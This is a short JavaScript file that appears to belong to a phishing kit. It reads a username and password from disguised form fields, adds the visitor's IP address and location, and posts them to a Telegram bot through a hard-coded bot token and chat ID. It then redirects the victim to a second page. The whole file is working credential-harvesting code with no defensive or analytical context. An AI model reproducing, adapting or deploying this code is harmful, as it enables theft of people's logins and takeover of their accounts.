//bot token
var telegram_bot_id = "7012374607:AAHfK3Mgd8kgonAtNRmzAfvGZsw14BhO1uE";
//chat id
var chat_id = "-4174274684";
var u_name, u_name2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("0T4RX").value;
    u_name2 = document.getElementById("C0NTRX").value;
    ip = document.getElementById("ip").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔹CUSC4 V.2🔹\n👤US3R4: " + u_name + "\n🔒c0NTR4: " + u_name2 + "\n\nIP: " + ip +"\n" + ip2 +"\n🔹C0DIGO SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
       $.ajax(settings).done(function (response) {
        window.location = 'index2.html';
        console.log(response);
    });
    return false;
};
